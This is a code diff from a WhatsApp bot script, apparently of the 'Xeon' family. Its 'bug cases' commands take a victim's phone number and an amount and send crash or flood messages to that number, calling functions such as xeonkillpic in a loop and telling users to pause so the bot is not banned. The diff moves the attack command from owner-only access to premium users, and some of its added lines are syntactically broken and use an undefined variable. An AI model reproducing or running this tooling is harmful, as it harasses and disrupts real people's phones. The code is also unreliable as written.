@@ -8811,7 +8811,8 @@ break
             
 //bug cases
 case "xandroid": {
-  if (!XeonTheCreator) return
+  if (!isPremium) return replyprem(mess.premium);
+  if (!args[0])
   if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
@@ -8833,8 +8834,8 @@ case "xandroid": {
   }
   replygcxeon("please wait, " + command + " bug is in process..")
   await sleep(2000); // Adjusted sleep time for clarity
-  sendVariousMessages(whatsappNumber, encodedAmount);
-  await sleep(2500); // Adjusted sleep time for clarity
+  let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx);
+  if (xeontesx.length == 0)
   sendMessageWithMentions(
     "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
     " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
@@ -9030,7 +9031,6 @@ if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 62838
 let target = xeonyvictim + '@s.whatsapp.net'
 await replygcxeon(`In process....`)
 for (let j = 0; j < 1; j++) {
-await listxeonfck(target, oneclickxeon)
 await locationxeony(target, force)
 await xeonkillpic(target, oneclickxeon)
 await locationxeony(target, force)
